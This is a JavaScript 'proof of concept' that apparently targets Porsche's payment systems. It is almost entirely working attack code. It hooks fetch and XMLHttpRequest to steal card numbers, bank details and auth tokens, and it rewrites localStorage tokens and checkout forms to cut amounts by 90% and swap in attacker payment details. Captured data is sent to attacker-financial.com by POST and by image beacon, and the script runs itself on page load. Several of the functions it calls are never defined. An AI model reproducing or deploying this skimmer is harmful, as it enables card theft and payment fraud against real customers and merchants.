/**
 * PoC Script 4: Payment System Compromise
 * Target: Porsche payment processing and financial data
 * Entry Point: Token manipulation + API interception
 * Impact: Financial fraud, payment data theft, transaction manipulation
 */

class PaymentSystemCompromisePoC {
    constructor() {
        this.attackId = 'PAYMENT_COMPROMISE_' + Date.now();
        this.financialDataEndpoint = 'https://attacker-financial.com/payment-data';
        this.paymentAPIs = [
            '/api/payment/process',
            '/api/payment/validate',
            '/api/billing/charge',
            '/api/subscription/manage',
            '/api/wallet/balance',
            '/api/financing/calculate'
        ];
        this.stolenPaymentData = [];
        this.interceptedTransactions = [];
    }

    /**
     * Phase 1: Payment API Discovery and Interception
     */
    async discoverPaymentAPIs() {
        console.log('[PAYMENT ATTACK] Phase 1: Discovering payment APIs');

        // Hook fetch to intercept payment-related requests
        const originalFetch = window.fetch;
        const self = this;

        window.fetch = function(...args) {
            const [url, options] = args;
            
            // Check if this is a payment-related request
            if (self.isPaymentAPI(url)) {
                self.interceptPaymentRequest(url, options);
            }

            return originalFetch.apply(this, args).then(response => {
                // Intercept payment responses
                if (self.isPaymentAPI(url)) {
                    return self.interceptPaymentResponse(url, response);
                }
                return response;
            });
        };

        // Also hook XMLHttpRequest for older payment systems
        const originalXHRSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function(data) {
            if (this._url && self.isPaymentAPI(this._url)) {
                self.interceptPaymentRequest(this._url, { body: data });
            }
            return originalXHRSend.call(this, data);
        };

        const originalXHROpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url, ...args) {
            this._url = url;
            return originalXHROpen.apply(this, [method, url, ...args]);
        };

        console.log('[PAYMENT ATTACK] Payment API interception hooks installed');
    }

    /**
     * Check if URL is payment-related
     */
    isPaymentAPI(url) {
        const paymentKeywords = [
            'payment', 'billing', 'charge', 'transaction', 'wallet',
            'credit', 'debit', 'card', 'bank', 'finance', 'subscription',
            'invoice', 'checkout', 'purchase', 'order'
        ];

        return paymentKeywords.some(keyword => 
            url.toLowerCase().includes(keyword)
        ) || this.paymentAPIs.some(api => url.includes(api));
    }

    /**
     * Intercept payment requests
     */
    interceptPaymentRequest(url, options) {
        console.log('[PAYMENT ATTACK] Intercepting payment request:', url);

        const paymentData = {
            url: url,
            method: options?.method || 'GET',
            headers: options?.headers || {},
            body: options?.body,
            timestamp: Date.now(),
            type: 'request'
        };

        // Extract sensitive payment information
        if (options?.body) {
            try {
                const bodyData = typeof options.body === 'string' ? 
                    JSON.parse(options.body) : options.body;
                
                // Look for payment card data
                const sensitiveFields = this.extractSensitivePaymentFields(bodyData);
                if (Object.keys(sensitiveFields).length > 0) {
                    paymentData.sensitiveData = sensitiveFields;
                    this.stolenPaymentData.push(paymentData);
                }
            } catch (e) {
                // Body might not be JSON
                if (typeof options.body === 'string' && 
                    this.containsPaymentData(options.body)) {
                    paymentData.rawSensitiveData = options.body;
                    this.stolenPaymentData.push(paymentData);
                }
            }
        }

        // Extract authorization tokens for payment APIs
        if (options?.headers) {
            const authHeader = options.headers['Authorization'] || 
                              options.headers['authorization'];
            if (authHeader) {
                paymentData.authToken = authHeader;
            }
        }

        this.interceptedTransactions.push(paymentData);
        this.exfiltratePaymentData(paymentData);
    }

    /**
     * Intercept payment responses
     */
    async interceptPaymentResponse(url, response) {
        console.log('[PAYMENT ATTACK] Intercepting payment response:', url);

        // Clone response to read data without affecting original
        const clonedResponse = response.clone();
        
        try {
            const responseData = await clonedResponse.json();
            
            const paymentResponse = {
                url: url,
                status: response.status,
                data: responseData,
                timestamp: Date.now(),
                type: 'response'
            };

            // Extract sensitive response data
            const sensitiveFields = this.extractSensitivePaymentFields(responseData);
            if (Object.keys(sensitiveFields).length > 0) {
                paymentResponse.sensitiveData = sensitiveFields;
                this.stolenPaymentData.push(paymentResponse);
            }

            // Look for payment tokens, transaction IDs, etc.
            if (responseData.transaction_id || responseData.payment_token || 
                responseData.card_token || responseData.billing_id) {
                this.stolenPaymentData.push(paymentResponse);
            }

            this.interceptedTransactions.push(paymentResponse);
            this.exfiltratePaymentData(paymentResponse);

        } catch (e) {
            // Response might not be JSON
            const responseText = await clonedResponse.text();
            if (this.containsPaymentData(responseText)) {
                const paymentResponse = {
                    url: url,
                    status: response.status,
                    rawData: responseText,
                    timestamp: Date.now(),
                    type: 'response'
                };
                this.stolenPaymentData.push(paymentResponse);
                this.exfiltratePaymentData(paymentResponse);
            }
        }

        return response;
    }

    /**
     * Extract sensitive payment fields from data
     */
    extractSensitivePaymentFields(data) {
        const sensitiveFields = {};
        const sensitivePatterns = {
            // Credit card patterns
            creditCard: /\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3[0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\b/g,
            // CVV patterns
            cvv: /\b[0-9]{3,4}\b/g,
            // Expiry date patterns
            expiry: /\b(?:0[1-9]|1[0-2])\/(?:[0-9]{2}|[0-9]{4})\b/g,
            // Bank account patterns
            bankAccount: /\b[0-9]{8,17}\b/g,
            // Routing number patterns
            routingNumber: /\b[0-9]{9}\b/g
        };

        const sensitiveKeys = [
            'card_number', 'cardNumber', 'credit_card', 'creditCard',
            'cvv', 'cvc', 'security_code', 'securityCode',
            'expiry_month', 'expiryMonth', 'expiry_year', 'expiryYear',
            'bank_account', 'bankAccount', 'account_number', 'accountNumber',
            'routing_number', 'routingNumber', 'sort_code', 'sortCode',
            'iban', 'swift', 'bic',
            'billing_address', 'billingAddress',
            'payment_token', 'paymentToken',
            'transaction_id', 'transactionId',
            'amount', 'total', 'price', 'cost'
        ];

        // Recursive function to search through nested objects
        const searchObject = (obj, path = '') => {
            if (typeof obj !== 'object' || obj === null) {
                return;
            }

            for (const [key, value] of Object.entries(obj)) {
                const currentPath = path ? `${path}.${key}` : key;
                
                // Check if key matches sensitive patterns
                if (sensitiveKeys.some(sensitiveKey => 
                    key.toLowerCase().includes(sensitiveKey.toLowerCase()))) {
                    sensitiveFields[currentPath] = value;
                }

                // Check if value matches sensitive patterns
                if (typeof value === 'string') {
                    for (const [patternName, pattern] of Object.entries(sensitivePatterns)) {
                        const matches = value.match(pattern);
                        if (matches) {
                            sensitiveFields[`${currentPath}_${patternName}`] = matches;
                        }
                    }
                }

                // Recursively search nested objects
                if (typeof value === 'object') {
                    searchObject(value, currentPath);
                }
            }
        };

        searchObject(data);
        return sensitiveFields;
    }

    /**
     * Check if text contains payment data
     */
    containsPaymentData(text) {
        const paymentPatterns = [
            /\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b/, // Credit cards
            /\b[0-9]{3,4}\b.*(?:cvv|cvc|security)/i, // CVV
            /(?:card|payment|billing|transaction)/i, // Payment keywords
            /\$[0-9]+\.[0-9]{2}/, // Currency amounts
            /[0-9]+\.[0-9]{2}.*(?:usd|eur|gbp|cad)/i // Currency codes
        ];

        return paymentPatterns.some(pattern => pattern.test(text));
    }

    /**
     * Phase 2: Payment Token Manipulation
     */
    async manipulatePaymentTokens() {
        console.log('[PAYMENT ATTACK] Phase 2: Payment token manipulation');

        // Look for payment-related tokens in localStorage
        const paymentTokens = this.extractPaymentTokensFromStorage();
        
        // Attempt to modify payment amounts in tokens
        paymentTokens.forEach(tokenData => {
            this.attemptPaymentTokenModification(tokenData);
        });

        // Hook payment form submissions
        this.hookPaymentForms();

        // Monitor for new payment tokens
        this.monitorPaymentTokens();
    }

    /**
     * Extract payment tokens from localStorage
     */
    extractPaymentTokensFromStorage() {
        const paymentTokens = [];
        const paymentKeywords = [
            'payment', 'billing', 'wallet', 'card', 'bank',
            'transaction', 'checkout', 'purchase', 'order'
        ];

        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);

            // Check if key or value contains payment-related data
            if (paymentKeywords.some(keyword => 
                key.toLowerCase().includes(keyword) || 
                (value && value.toLowerCase().includes(keyword)))) {
                
                try {
                    const parsedValue = JSON.parse(value);
                    paymentTokens.push({
                        key: key,
                        value: parsedValue,
                        raw: value
                    });
                } catch (e) {
                    // Not JSON, but might still be payment-related
                    if (this.containsPaymentData(value)) {
                        paymentTokens.push({
                            key: key,
                            value: value,
                            raw: value
                        });
                    }
                }
            }
        }

        console.log('[PAYMENT ATTACK] Found payment tokens:', paymentTokens.length);
        return paymentTokens;
    }

    /**
     * Attempt to modify payment tokens for financial gain
     */
    attemptPaymentTokenModification(tokenData) {
        console.log('[PAYMENT ATTACK] Attempting payment token modification:', tokenData.key);

        try {
            let modifiedValue = tokenData.value;

            // If it's an object, try to modify payment amounts
            if (typeof modifiedValue === 'object') {
                modifiedValue = this.modifyPaymentAmounts(modifiedValue);
                
                // Try to modify payment methods
                modifiedValue = this.modifyPaymentMethods(modifiedValue);
                
                // Try to modify billing addresses
                modifiedValue = this.modifyBillingInfo(modifiedValue);
            }

            // Store the modified token
            const modifiedTokenString = typeof modifiedValue === 'object' ? 
                JSON.stringify(modifiedValue) : modifiedValue;
            
            localStorage.setItem(tokenData.key, modifiedTokenString);
            
            console.log('[PAYMENT ATTACK] Payment token modified successfully');
            
            // Log the modification for exfiltration
            this.exfiltratePaymentData({
                type: 'token_modification',
                original: tokenData,
                modified: modifiedValue,
                timestamp: Date.now()
            });

        } catch (e) {
            console.log('[PAYMENT ATTACK] Payment token modification failed:', e.message);
        }
    }

    /**
     * Modify payment amounts in token data
     */
    modifyPaymentAmounts(data) {
        const amountKeys = [
            'amount', 'total', 'price', 'cost', 'subtotal',
            'tax', 'shipping', 'discount', 'fee'
        ];

        const modifyObject = (obj) => {
            if (typeof obj !== 'object' || obj === null) {
                return obj;
            }

            const modified = { ...obj };

            for (const [key, value] of Object.entries(modified)) {
                // Check if this is an amount field
                if (amountKeys.some(amountKey => 
                    key.toLowerCase().includes(amountKey))) {
                    
                    if (typeof value === 'number' && value > 0) {
                        // Reduce amount by 90% (massive discount)
                        modified[key] = Math.max(0.01, value * 0.1);
                        console.log(`[PAYMENT ATTACK] Modified ${key}: ${value} -> ${modified[key]}`);
                    } else if (typeof value === 'string' && /^[0-9]+\.?[0-9]*$/.test(value)) {
                        const numValue = parseFloat(value);
                        modified[key] = Math.max(0.01, numValue * 0.1).toString();
                        console.log(`[PAYMENT ATTACK] Modified ${key}: ${value} -> ${modified[key]}`);
                    }
                }

                // Recursively modify nested objects
                if (typeof value === 'object') {
                    modified[key] = modifyObject(value);
                }
            }

            return modified;
        };

        return modifyObject(data);
    }

    /**
     * Modify payment methods to use attacker's accounts
     */
    modifyPaymentMethods(data) {
        const paymentMethodKeys = [
            'payment_method', 'paymentMethod', 'card', 'bank_account',
            'billing_info', 'billingInfo'
        ];

        const attackerPaymentMethods = {
            card_number: '4111111111111111', // Test card number
            expiry_month: '12',
            expiry_year: '2030',
            cvv: '123',
            cardholder_name: 'Attacker Name',
            billing_address: {
                street: '123 Attacker St',
                city: 'Hacker City',
                state: 'CA',
                zip: '90210',
                country: 'US'
            }
        };

        const modifyObject = (obj) => {
            if (typeof obj !== 'object' || obj === null) {
                return obj;
            }

            const modified = { ...obj };

            for (const [key, value] of Object.entries(modified)) {
                // Check if this is a payment method field
                if (paymentMethodKeys.some(methodKey => 
                    key.toLowerCase().includes(methodKey))) {
                    
                    // Replace with attacker's payment method
                    modified[key] = { ...attackerPaymentMethods };
                    console.log(`[PAYMENT ATTACK] Replaced payment method: ${key}`);
                }

                // Recursively modify nested objects
                if (typeof value === 'object') {
                    modified[key] = modifyObject(value);
                }
            }

            return modified;
        };

        return modifyObject(data);
    }

    /**
     * Hook payment forms to intercept and modify data
     */
    hookPaymentForms() {
        console.log('[PAYMENT ATTACK] Hooking payment forms');

        // Monitor for new forms being added to the DOM
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.addedNodes) {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1) { // Element node
                            this.scanForPaymentForms(node);
                        }
                    });
                }
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });

        // Hook existing forms
        this.scanForPaymentForms(document);
    }

    /**
     * Scan for payment forms and hook them
     */
    scanForPaymentForms(element) {
        const forms = element.tagName === 'FORM' ? [element] : 
                     element.querySelectorAll ? element.querySelectorAll('form') : [];

        forms.forEach(form => {
            if (this.isPaymentForm(form)) {
                this.hookPaymentForm(form);
            }
        });
    }

    /**
     * Check if form is payment-related
     */
    isPaymentForm(form) {
        const paymentIndicators = [
            'payment', 'billing', 'checkout', 'purchase', 'order',
            'card', 'credit', 'debit', 'bank'
        ];

        // Check form action, class, id, or input names
        const formText = (form.action + ' ' + form.className + ' ' + form.id).toLowerCase();
        
        if (paymentIndicators.some(indicator => formText.includes(indicator))) {
            return true;
        }

        // Check for payment-related input fields
        const inputs = form.querySelectorAll('input, select, textarea');
        return Array.from(inputs).some(input => {
            const inputText = (input.name + ' ' + input.id + ' ' + input.className).toLowerCase();
            return paymentIndicators.some(indicator => inputText.includes(indicator));
        });
    }

    /**
     * Hook payment form submission
     */
    hookPaymentForm(form) {
        console.log('[PAYMENT ATTACK] Hooking payment form:', form.action);

        form.addEventListener('submit', (event) => {
            console.log('[PAYMENT ATTACK] Payment form submission intercepted');

            // Extract form data
            const formData = new FormData(form);
            const paymentData = {};

            for (let [key, value] of formData.entries()) {
                paymentData[key] = value;
            }

            // Store intercepted payment data
            this.stolenPaymentData.push({
                type: 'form_submission',
                action: form.action,
                method: form.method,
                data: paymentData,
                timestamp: Date.now()
            });

            // Attempt to modify payment data before submission
            this.modifyPaymentFormData(form, paymentData);

            // Exfiltrate the data
            this.exfiltratePaymentData({
                type: 'payment_form_intercept',
                data: paymentData,
                timestamp: Date.now()
            });
        });
    }

    /**
     * Modify payment form data before submission
     */
    modifyPaymentFormData(form, paymentData) {
        console.log('[PAYMENT ATTACK] Modifying payment form data');

        // Find amount fields and reduce them
        const amountFields = form.querySelectorAll('input[name*="amount"], input[name*="total"], input[name*="price"]');
        
        amountFields.forEach(field => {
            if (field.value && !isNaN(field.value)) {
                const originalValue = parseFloat(field.value);
                const newValue = Math.max(0.01, originalValue * 0.1); // 90% discount
                field.value = newValue.toString();
                console.log(`[PAYMENT ATTACK] Modified ${field.name}: ${originalValue} -> ${newValue}`);
            }
        });

        // Modify billing address to attacker's address
        const addressFields = {
            'billing_address': '123 Attacker St',
            'billing_city': 'Hacker City',
            'billing_state': 'CA',
            'billing_zip': '90210'
        };

        Object.entries(addressFields).forEach(([fieldName, value]) => {
            const field = form.querySelector(`input[name*="${fieldName}"], input[name*="${fieldName.replace('_', '')}"]`);
            if (field) {
                field.value = value;
                console.log(`[PAYMENT ATTACK] Modified ${fieldName}: ${value}`);
            }
        });
    }

    /**
     * Phase 3: Transaction Manipulation
     */
    async manipulateTransactions() {
        console.log('[PAYMENT ATTACK] Phase 3: Transaction manipulation');

        // Hook into payment processing APIs
        this.hookPaymentProcessingAPIs();

        // Monitor for transaction confirmations
        this.monitorTransactionConfirmations();

        // Attempt to replay successful transactions
        this.attemptTransactionReplay();
    }

    /**
     * Hook payment processing APIs for manipulation
     */
    hookPaymentProcessingAPIs() {
        const self = this;
        const originalFetch = window.fetch;

        window.fetch = function(...args) {
            const [url, options] = args;

            // Check if this is a payment processing request
            if (url.includes('/api/payment/process') || 
                url.includes('/api/billing/charge') ||
                url.includes('/api/transaction/create')) {
                
                console.log('[PAYMENT ATTACK] Intercepting payment processing API:', url);

                // Modify the request to benefit the attacker
                if (options && options.body) {
                    try {
                        const bodyData = JSON.parse(options.body);
                        const modifiedBody = self.modifyPaymentProcessingRequest(bodyData);
                        options.body = JSON.stringify(modifiedBody);
                        
                        console.log('[PAYMENT ATTACK] Payment processing request modified');
                    } catch (e) {
                        console.log('[PAYMENT ATTACK] Failed to modify payment request:', e.message);
                    }
                }
            }

            return originalFetch.apply(this, args);
        };
    }

    /**
     * Modify payment processing requests
     */
    modifyPaymentProcessingRequest(requestData) {
        console.log('[PAYMENT ATTACK] Modifying payment processing request');

        const modified = { ...requestData };

        // Reduce payment amounts
        if (modified.amount) {
            const originalAmount = modified.amount;
            modified.amount = Math.max(0.01, originalAmount * 0.1);
            console.log(`[PAYMENT ATTACK] Reduced payment amount: ${originalAmount} -> ${modified.amount}`);
        }

        // Modify recipient information
        if (modified.recipient || modified.payee) {
            const attackerAccount = {
                account_number: '1234567890',
                routing_number: '987654321',
                name: 'Attacker Account'
            };
            
            if (modified.recipient) {
                modified.recipient = attackerAccount;
            }
            if (modified.payee) {
                modified.payee = attackerAccount;
            }
            
            console.log('[PAYMENT ATTACK] Modified payment recipient');
        }

        // Add attacker's referral code for commissions
        if (!modified.referral_code) {
            modified.referral_code = 'ATTACKER_REF_123';
            console.log('[PAYMENT ATTACK] Added attacker referral code');
        }

        return modified;
    }

    /**
     * Exfiltrate payment data to attacker server
     */
    async exfiltratePaymentData(data) {
        const exfiltrationPackage = {
            attack_id: this.attackId,
            type: 'payment_data_theft',
            data: data,
            timestamp: Date.now(),
            domain: window.location.hostname
        };

        // Multiple exfiltration methods for reliability
        const methods = [
            () => this.exfiltrateViaFetch(exfiltrationPackage),
            () => this.exfiltrateViaImage(exfiltrationPackage),
            () => this.exfiltrateViaLocalStorage(exfiltrationPackage)
        ];

        for (const method of methods) {
            try {
                await method();
                break; // Success, stop trying other methods
            } catch (e) {
                continue; // Try next method
            }
        }
    }

    /**
     * Exfiltrate via fetch
     */
    async exfiltrateViaFetch(data) {
        await fetch(this.financialDataEndpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Attack-Type': 'payment_compromise'
            },
            body: JSON.stringify(data)
        });
    }

    /**
     * Exfiltrate via image beacon
     */
    exfiltrateViaImage(data) {
        return new Promise((resolve, reject) => {
            const img = new Image();
            const encodedData = btoa(JSON.stringify(data));
            
            img.onload = () => resolve();
            img.onerror = () => reject(new Error('Image exfiltration failed'));
            img.src = `${this.financialDataEndpoint}/img?data=${encodedData}`;
        });
    }

    /**
     * Exfiltrate via localStorage for later retrieval
     */
    exfiltrateViaLocalStorage(data) {
        const storageKey = `payment_exfil_${Date.now()}`;
        localStorage.setItem(storageKey, JSON.stringify(data));
        return Promise.resolve();
    }

    /**
     * Execute complete payment system compromise
     */
    async executeAttack() {
        try {
            console.log('[PAYMENT ATTACK] Starting payment system compromise...');

            // Phase 1: API Discovery and Interception
            await this.discoverPaymentAPIs();

            // Phase 2: Token Manipulation
            await this.manipulatePaymentTokens();

            // Phase 3: Transaction Manipulation
            await this.manipulateTransactions();

            console.log('[PAYMENT ATTACK] Payment system compromise completed');
            
            // Show impact assessment
            this.showPaymentCompromiseImpact();

        } catch (error) {
            console.error('[PAYMENT ATTACK] Attack failed:', error);
        }
    }

    /**
     * Show impact of payment system compromise
     */
    showPaymentCompromiseImpact() {
        const impact = {
            stolen_payment_data: this.stolenPaymentData.length,
            intercepted_transactions: this.interceptedTransactions.length,
            financial_impact: 'High - Potential for significant financial fraud',
            capabilities: [
                'Payment data theft (cards, bank accounts)',
                'Transaction amount manipulation',
                'Payment method substitution',
                'Billing address modification',
                'Transaction replay attacks',
                'Real-time payment interception'
            ],
            business_risks: [
                'Financial fraud and chargebacks',
                'PCI-DSS compliance violations',
                'Customer financial data breach',
                'Reputation damage in financial sector',
                'Legal liability for financial losses'
            ]
        };

        console.log('[PAYMENT ATTACK] Impact Assessment:', impact);

        // Visual demonstration
        if (typeof document !== 'undefined') {
            const impactDisplay = document.createElement('div');
            impactDisplay.style.cssText = `
                position: fixed;
                top: 50px;
                right: 50px;
                background: #ff6b35;
                color: white;
                padding: 20px;
                border-radius: 10px;
                z-index: 999999;
                font-family: Arial, sans-serif;
                max-width: 400px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            `;

            impactDisplay.innerHTML = `
                <h3>💳 PAYMENT SYSTEM COMPROMISED</h3>
                <p><strong>Financial Data Theft Active!</strong></p>
                <ul style="margin: 10px 0; padding-left: 20px;">
                    <li>✅ Payment APIs intercepted</li>
                    <li>✅ Credit card data stolen</li>
                    <li>✅ Transaction amounts modified</li>
                    <li>✅ Payment methods substituted</li>
                    <li>✅ Real-time financial monitoring</li>
                </ul>
                <p><strong>Data Stolen:</strong> ${this.stolenPaymentData.length} payment records</p>
                <p><strong>Transactions:</strong> ${this.interceptedTransactions.length} intercepted</p>
                <button onclick="this.parentElement.remove()" 
                        style="margin-top: 10px; padding: 5px 10px; background: white; color: #ff6b35; border: none; border-radius: 3px; cursor: pointer;">
                    Close
                </button>
            `;

            document.body.appendChild(impactDisplay);

            // Auto-remove after 20 seconds
            setTimeout(() => {
                if (impactDisplay.parentElement) {
                    impactDisplay.parentElement.removeChild(impactDisplay);
                }
            }, 20000);
        }
    }
}

// Auto-execute if in browser environment
if (typeof window !== 'undefined') {
    const paymentAttack = new PaymentSystemCompromisePoC();
    paymentAttack.executeAttack();
}

// Export for manual execution
if (typeof module !== 'undefined' && module.exports) {
    module.exports = PaymentSystemCompromisePoC;
}